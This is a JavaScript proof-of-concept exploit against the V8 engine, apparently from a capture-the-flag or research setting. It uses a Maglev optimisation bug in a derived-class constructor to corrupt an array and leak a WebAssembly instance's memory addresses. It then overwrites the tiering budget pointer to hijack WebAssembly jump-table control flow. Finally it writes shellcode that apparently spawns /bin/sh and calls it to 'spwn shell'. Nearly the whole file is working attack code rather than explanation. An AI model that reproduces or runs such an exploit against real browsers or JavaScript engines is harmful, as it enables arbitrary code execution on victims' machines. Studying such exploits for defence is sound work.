var addrOf_LO = new Array(0x3000);


var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x09, 0x02, 0x60,  0x00, 0x00, 0x60, 0x02, 0x7f, 0x7e, 0x00, 0x03, 0x05, 0x04, 0x00, 0x00,  0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x22, 0x04, 0x03, 0x6e,  0x6f, 0x70, 0x00, 0x00, 0x04, 0x6e, 0x6f, 0x70, 0x32, 0x00, 0x01, 0x09,  0x61, 0x72, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x05,  0x73, 0x68, 0x65, 0x6c, 0x6c, 0x00, 0x03, 0x0a, 0x29, 0x04, 0x03, 0x00,  0x01, 0x0b, 0x15, 0x00, 0x01, 0x41, 0x00, 0x41, 0xad, 0xbd, 0x03, 0x36,  0x02, 0x00, 0x41, 0x01, 0x41, 0xad, 0xbd, 0x03, 0x36, 0x02, 0x00, 0x0b,  0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b, 0x03, 0x00,  0x01, 0x0b
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { shell, arb_write, nop, nop2 } = wasm_instance.exports;

for(var i = 0;i< 0x30;i++)addrOf_LO[i]=0x11221122;

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }
  
    nop_nop() {
       
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f){
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }
    
        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }
    
        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}



var helper = new Helpers();
class C2 {
}
var ggg;
var ggg_fake;
var corrupted_arr = [1.1];
let index = 0x30;
while(index < 0x100){
    addrOf_LO[index+1] = wasm_instance;
    addrOf_LO[index+2] = wasm_instance;
    addrOf_LO[index+3] = wasm_instance;
    addrOf_LO[index+0] = wasm_instance;
    index += 4;
}

var gcSize = 0x4fe00000;
function gc() {
    new ArrayBuffer(gcSize);
}


let first = 1;
let fake_object_array;
class C3 extends C2 {
    constructor(obj) {
        try { new.target(); } catch (e) {}
        super();
        const v12 = new Array(32);
        const v14 = new Array(64);
        // %DebugPrint(v12);
            for (let v13 = 0; v13 < 2; v13++) {
                // var x = [0.1, 0.2, 0.3];
                // %DebugPrint(x);
                if(!v13) {
                 

                    helper.scavenge_gc();
                    fake_object_array = [1.9196715642022913e-307,helper.hex_to_dbl("0x6cd0018efb1"),helper.hex_to_dbl("0x3000000190004"), 5.743499907618807e-309]; // runtime

                } 
                else{
                    obj.c = v12;
                    obj.e = corrupted_arr; 
                    obj.d = v14 ;
                }

            }
       
        %OptimizeMaglevOnNextCall(C3);
        
       
       
    }
}



function pwn(){

    let obj = {a: [], c: "a" };

    new C3(obj);
    new C3(obj);
    new C3(obj);
    let leak_addr = [];
    let begin_scan = 0;
    let found = 0;
    %DebugPrint(obj.d);

    for(let i = begin_scan;i < begin_scan+0x5200;i++){

        print(obj.d[i])

        // if(obj.d[i] === 1.6847547739226092e+20){
        //         console.log("[*] Found the pilot at: " + i + " 0x");
        //         helper.print_hex(obj.d[i]);
        //         found = i;
        //         break;
        // }

    }
    // return;
    for(let i = found; i < found + 0x60;i++){
        if(obj.d[i]!= 1.6847547739226092e+20) leak_addr.push(obj.d[i]); 

    }
    let addr_off = leak_addr[1];

    let  wasm_instance_off = helper.ftoil(addr_off) 
    let was_instance_off_correct = wasm_instance_off>>8;

    let index_to_leak = Math.round((was_instance_off_correct - 1 - 0x190000 )/ 8);
    leak_addr = [];
    for(var i = index_to_leak; i < index_to_leak + 0x100;i++){

        leak_addr.push(obj.d[i]);

    }



    let jump_table_start = BigInt(helper.f64toi64(leak_addr[7])) >> 8n; 
    let tiering_budget_array_off = index_to_leak + 13; 
    let tiering_budget_array_off_addr = BigInt(helper.f64toi64(leak_addr[13])) >> 8n; 


    nop();
    nop2();
    arb_write(0, 10n);
    shell();
   
    let shellcode_off = 0x9c0n;


    let shr_instruction_addr = jump_table_start + 0x95cn;
    let sub_instruction_addr = jump_table_start + 0x8fan; 
    let add_instruction_addr = jump_table_start + 0x960n;
    let js_instruction_addr = jump_table_start + 0x8f7n;
    let shellcode_addr = jump_table_start + shellcode_off;
    

    obj.d[tiering_budget_array_off] = helper.i64tof64(sub_instruction_addr << 8n);

    
  nop(); 
  nop(); 
    
  obj.d[tiering_budget_array_off] = helper.i64tof64(((js_instruction_addr+1n)<<8n));
  nop2(); 

  obj.d[tiering_budget_array_off] = helper.i64tof64(((shr_instruction_addr-4n+3n)<<8n));
  for (let _ = 0; _ < 12; _++) {
    nop2(); 
  }
    obj.d[tiering_budget_array_off] = helper.i64tof64(((add_instruction_addr-4n)<<8n));
  nop2(); 
  obj.d[tiering_budget_array_off] = helper.i64tof64((tiering_budget_array_off_addr<<8n));
    obj.d[tiering_budget_array_off-9] = 0; 
    obj.d[tiering_budget_array_off-10] = helper.i64tof64((shellcode_addr<<8n));
}


const shellcode = [
    0x732f6e69622fb848n, 0x66525f5450990068n, 0x5e8525e54632d68n, 0x68736162000000n, 0xf583b6a5e545756n, 0x5n
  ];
pwn();


function final(){
    shellcode.map((code, i) => {
        arb_write(i * 8, code);
      })
    
      console.log("[+] spwn shell!!!")
    shell(); 
}
// final();
 
  